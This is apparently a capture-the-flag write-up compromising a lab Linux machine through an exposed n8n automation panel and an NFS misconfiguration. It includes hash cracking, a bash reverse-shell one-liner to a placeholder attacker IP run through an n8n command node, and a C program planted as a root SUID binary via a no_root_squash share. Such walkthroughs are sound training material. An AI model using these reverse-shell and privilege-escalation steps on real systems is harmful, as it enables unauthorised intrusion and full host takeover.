# WebFlow — HackingClub

## Machine Information

| Attribute  | Value                                   |
| ---------- | --------------------------------------- |
| Platform   | HackingClub                             |
| Machine    | WebFlow                                 |
| Difficulty | Easy                                    |
| OS         | Linux                                   |
| Category   | Web Exploitation / Privilege Escalation |

---

# Overview

This write-up documents the exploitation process for the **WebFlow** machine on the **HackingClub** platform.

The attack chain involved the following stages:

* Network reconnaissance
* Subdomain discovery
* Web application enumeration
* Automation panel discovery (n8n)
* Hash extraction from application files
* Password cracking
* Authenticated abuse of automation workflows
* Reverse shell access
* Privilege escalation through **NFS misconfiguration**

This machine required chaining multiple techniques together rather than exploiting a single vulnerability.

---

# Reconnaissance

The first step was identifying exposed services using **Nmap**.

```bash
nmap -p- -Pn --open --min-rate 1200 172.16.9.54
```

The scan revealed two open ports:

```
22/tcp
80/tcp
```

Next, a service detection scan was performed.

```bash
nmap -p 22,80 -sVC 172.16.9.54 -vvv
```

Results:

```
22/tcp open  ssh
80/tcp open  http
```

The main attack surface was the **web service running on port 80**.

---

# Initial Web Access

Opening the page in the browser revealed the hostname:

```
webflow.hc
```

Since this hostname did not resolve locally, it was added to the hosts file.

```bash
echo "172.16.9.54 webflow.hc" | sudo tee -a /etc/hosts
```

After updating the hosts file, the application loaded correctly.

However, the homepage did not expose much functionality, suggesting the presence of hidden resources such as:

* directories
* files
* virtual hosts

---

# Subdomain Enumeration

To discover hidden virtual hosts, I performed subdomain fuzzing using **ffuf**.

```bash
ffuf -u http://webflow.hc/ \
-H "Host: FUZZ.webflow.hc" \
-w subdomains-top1million.txt \
-c -t 100 -fl 1
```

Important concept:

Instead of relying on DNS resolution, this technique modifies the **HTTP Host header**, allowing discovery of virtual hosts served from the same IP address.

The scan eventually revealed a valid subdomain:

```
automation.webflow.hc
```

The new subdomain was added to `/etc/hosts`.

```bash
echo "172.16.9.54 automation.webflow.hc" | sudo tee -a /etc/hosts
```

Opening the subdomain in the browser exposed an **automation platform login panel**.

---

# Automation Platform Discovery

The panel was identified as **n8n**, an automation workflow platform.

n8n allows users to create workflows that execute tasks on the server, interact with APIs, and run scripts.

Because workflow engines often execute commands internally, they represent a valuable attack surface.

However, authentication was required before accessing the panel.

---

# Extracting Application Files

Before attempting brute force attacks, I searched for application files that might contain credentials.

Through web enumeration and file access, I retrieved configuration data belonging to the automation service.

One particularly useful artifact was the **application database**, which contained user credentials.

A user account discovered:

```
kilts
```

The password was stored as a **bcrypt hash**.

---

# Password Cracking

The hash was saved locally.

```bash
nano hash.txt
```

Then cracked using **John the Ripper**.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

After some time the password was recovered:

```
P@ssw0rd
```

Credentials obtained:

```
kilts:P@ssw0rd
```

---

# Accessing the Automation Panel

Using the recovered credentials, authentication succeeded at:

```
http://automation.webflow.hc
```

After logging in, the **n8n dashboard** became accessible.

Inside the dashboard it was possible to create and execute workflows.

---

# Remote Code Execution via Workflow

Within n8n, I created a new workflow.

The platform includes nodes capable of executing system commands.

A reverse shell payload was used.

First, a listener was prepared on the attacking machine.

```bash
nc -lvnp 443
```

Then the following payload was configured in the command execution node:

```bash
/bin/bash -c "sh -i >& /dev/tcp/ATTACKER_IP/443 0>&1"
```

When the workflow executed, the shell connected back.

Access obtained:

```
appsvc
```

---

# Shell Stabilization

The initial shell was not fully interactive, so it was stabilized.

```bash
script /dev/null -c bash
```

Then:

```
CTRL + Z
stty raw -echo; fg
```

After this, the shell behaved as a proper interactive terminal.

---

# User Flag

The user flag was located in the service account directory.

```bash
cd /home/appsvc
ls
cat user.txt
```

---

# Privilege Escalation

During enumeration I discovered that `/tmp` was exported through **NFS**.

Inspection of the NFS configuration revealed the following option:

```
no_root_squash
```

Normally, NFS maps root operations from the client to a restricted user (`nobody`).
However, when **no_root_squash** is enabled, root on the client machine remains root on the server.

This misconfiguration allows attackers to create **root-owned files on the target system**.

---

# Mounting the NFS Share

On the attacking machine, the share was mounted.

```bash
mkdir /tmp/malicious
sudo mount -t nfs 172.16.9.54:/tmp /tmp/malicious
```

The remote `/tmp` directory was now accessible locally.

---

# Creating a Root SUID Binary

To exploit the misconfiguration, a small C program was created to spawn a root shell.

```c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

Compile the program:

```bash
gcc exploit.c -o exploit
```

Copy the binary into the mounted NFS share:

```bash
cp exploit /tmp/malicious/
```

Set ownership and SUID permissions:

```bash
sudo chown root:root /tmp/malicious/exploit
sudo chmod 4755 /tmp/malicious/exploit
```

Because the NFS share allows **root operations**, the binary becomes a **root-owned SUID executable on the target machine**.

---

# Root Access

Returning to the shell on the victim machine:

```bash
/tmp/exploit
```

This immediately spawned a **root shell**.

Verification:

```bash
whoami
```

Output:

```
root
```

---

# Root Flag

Finally, the root flag was retrieved.

```bash
cd /root
cat root.txt
```

---

# Skills Practiced

* Nmap enumeration
* Virtual host fuzzing with ffuf
* Web application analysis
* Credential extraction from application files
* Password cracking with John the Ripper
* Automation platform abuse
* Reverse shell techniques
* Shell stabilization
* NFS privilege escalation
* SUID binary exploitation

---

# Final Result

Machine successfully compromised.

```
User: root
System: Linux
Platform: HackingClub
Machine: WebFlow
Difficulty: Easy
```

---

# Personal Notes

This machine reinforced several important pentesting concepts.

The most interesting parts were:

* discovering hidden virtual hosts through **Host header fuzzing**
* extracting credentials from application files
* abusing an automation platform to gain command execution
* exploiting an **NFS configuration mistake** to escalate privileges

The NFS privilege escalation was particularly valuable to understand, as it demonstrates how a misconfigured network file system can completely compromise a host.
